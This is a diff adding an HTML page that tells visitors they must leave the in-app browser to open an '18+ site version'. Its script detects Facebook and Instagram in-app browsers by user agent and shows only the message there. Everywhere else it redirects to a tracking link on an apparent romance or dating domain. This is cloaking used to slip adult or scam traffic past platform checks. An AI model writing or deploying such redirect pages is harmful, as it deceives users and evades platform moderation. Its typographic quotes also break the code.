@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang=“en”>
+<head>
+  <meta charset=“UTF-8”>
+  <meta name=“viewport” content=“width=device-width, initial-scale=1.0”>
+  <title>Browser Redirect</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    .message {
+      max-width: 600px;
+    }
+    .message h1 {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class=“message”>
+    <h1>You must run browser to open 18+ site version.</h1>
+    <p>1. Click the three dots in the top right corner.</p>
+    <p>2. Tap “Open in browser” from the menu that opens.</p>
+  </div>
+
+
+<script>
+    // Uygulama içi tarayıcı kontrolü
+    if (window.navigator.userAgent.includes(‘FBAN’) || window.navigator.userAgent.includes(‘Instagram’)) {
+      // Eğer uygulama içindeyse sadece mesaj göster
+      console.log(‘In-app browser detected’);
+    } else {
+      // Harici tarayıcıya geçiş yapıldığında yönlendirme
+      window.location.href = “https://edrpmrg.romance-matches-paradise.com/pmt2c60?t=X”;
+    }
+  </script>
+</body>
+</html>
